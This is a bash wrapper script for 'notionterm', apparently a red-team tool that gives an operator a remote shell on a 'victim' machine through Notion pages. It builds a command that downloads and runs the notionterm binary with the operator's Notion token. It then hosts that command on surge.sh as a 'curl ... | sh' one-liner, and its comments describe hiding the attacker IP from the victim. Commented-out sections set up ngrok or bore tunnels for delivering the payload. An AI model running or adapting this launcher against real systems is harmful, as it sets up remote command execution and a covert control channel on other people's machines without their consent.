#!/usr/bin/env bash




SHORTCUT=true

for i in "$@"; do
    case $i in
    --no-shortcuts|-N)
        SHORTCUT="" # ~ setting at false
        ;;
    *)    
        ;;
    esac
done

## Simple wrapper, do not send static ngrok to remote

## Wrap it: tmux new-session -s notionterm 'wrap-notionterm.sh'
# if [[ -z "${TMUX}" ]]; then
#     echo "Must be run in tmux"
#     exit 92
# fi

TOKEN="$(gum input --password --placeholder="Enter notion token")"

# IFS=$'\n'
# IPS=$(ip -brief -j -c address | jq -r '.[] | select((.operstate=="UP") or (.operstate=="UNKNOWN")) | "\(.ifname): \(.addr_info[0].local)\n"')
# IP_CHOICE=$(gum choose $IPS "tunnel: ngrok" "tunnel: bore")

# # Webserver config
# YELLOW='\033[0;33m'
# NC='\033[0m' # No Color
# echo "${YELLOW} If you really want to hide attacker IP from victim do not use this to transfer notionterm on victim machine${NC}"
# LPORT=$(gum input --placeholder "enter local port")
# PORT=""
# ENDPOINT=""

# if [ "$IP_CHOICE" = "tunnel: ngrok" ]; then
#     # launch ngrok, retrieve endpoint + port
#     tmux split-window -v "ngrok tcp ${LPORT}"
#     sleep 4 # wait for ngrok to start
#     NGROK_ENDPOINT_TCP=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | jq -r ".tunnels[0].public_url")
#     NGROK_ENDPOINT="$(echo $NGROK_ENDPOINT_TCP | cut -d ':' -f 2-3 | cut -d '/' -f 3-)"
#     TUNNEL_ENDPOINT="${NGROK_ENDPOINT}"
#     ENDPOINT="$(echo $TUNNEL_ENDPOINT | cut -d ':' -f 1)"
#     PORT="$(echo $TUNNEL_ENDPOINT | cut -d ':' -f 2)"
# elif [ "$IP_CHOICE" = "tunnel: bore" ]; then
#     tmux split-window -v "bore local ${LPORT} --to bore.pub"
#     PORT=$(gum input --placeholder "enter bore.pub remote_port given")
#     ENDPOINT="bore.pub"
# else
#     ENDPOINT=$(echo $IP_CHOICE | cut -d ":" -f 2 | cut -d " " -f 2)
#     PORT=$LPORT
# fi

# tmux split-window -h "python -m http.server ${LPORT}"

# # Notionterm on target
REMOTE_CMD="curl -lO -L -s https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm"
MODE="$(gum choose "target → notion" "from any page" "normal")"
TARGET_URL=""

if [ "$MODE" = "target → notion" ]; then
    PAGEID="$(gum input --placeholder="Enter notion page ID (CTRL+L)")"
    REMOTE_CMD="${REMOTE_CMD} && ./notionterm light -u ${PAGEID} -t ${TOKEN}"
elif [ "$MODE" = "from any page" ]; then
    REMOTE_CMD="${REMOTE_CMD} && ./notionterm --server -t ${TOKEN}"
    TARGET_URL="$(gum input --placeholder="Enter target IP/URL")"
    gum confirm "Include Port (9292) in target IP/URL?" && TARGET_URL="${TARGET_URL}:9292"
else
    PAGEID="$(gum input --placeholder="Enter notion page ID (CTRL+L)")"
    REMOTE_CMD="${REMOTE_CMD} && ./notionterm -u ${PAGEID} -t ${TOKEN}"
    TARGET_URL="$(gum input --placeholder="Enter target IP/URL")"
    gum confirm "Include Port (9292) in target IP/URL?" && TARGET_URL="${TARGET_URL}:9292"
fi


if [[ "$TARGET_URL" ]];
then
    REMOTE_CMD="${REMOTE_CMD} -o ${TARGET_URL}"
fi


# with shorter shortcut? Use surge to not expose attacker IP
if [[ "$SHORTCUT" ]]; then
    ## Write file for gitar
    echo "notionterm.surge.sh" > CNAME
    echo $REMOTE_CMD > sh
    surge .
    rm sh CNAME
    REMOTE_CMD="curl https://notionterm.surge.sh/sh|sh\n"
    clear
fi

echo -e  "${REMOTE_CMD}"

if [[ "$SHORTCUT" ]]; then
    trap 'surge teardown notionterm.surge.sh' SIGINT
    YELLOW='\033[0;33m'
    NC='\033[0m' # No Color
    echo
    echo -e "${YELLOW}CTRL+C when job done (trigger 'surge teardown notionterm.surge.sh')${NC}" && sleep infinity
fi
